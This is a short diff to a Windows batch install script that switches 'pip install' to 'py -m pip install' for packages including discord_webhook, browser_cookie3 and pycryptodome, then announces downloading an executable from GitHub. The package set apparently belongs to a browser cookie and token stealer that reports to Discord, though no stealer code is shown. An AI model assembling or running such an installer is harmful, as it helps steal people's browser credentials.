@@ -2,7 +2,7 @@
 
 REM
 echo Installing dependencies...
-pip install discord_webhook browser_cookie3 psutil pywin32 pycryptodome
+py -m pip install discord_webhook browser_cookie3 psutil pywin32 pycryptodome
 
 REM 
 echo Downloading executable file from GitHub...
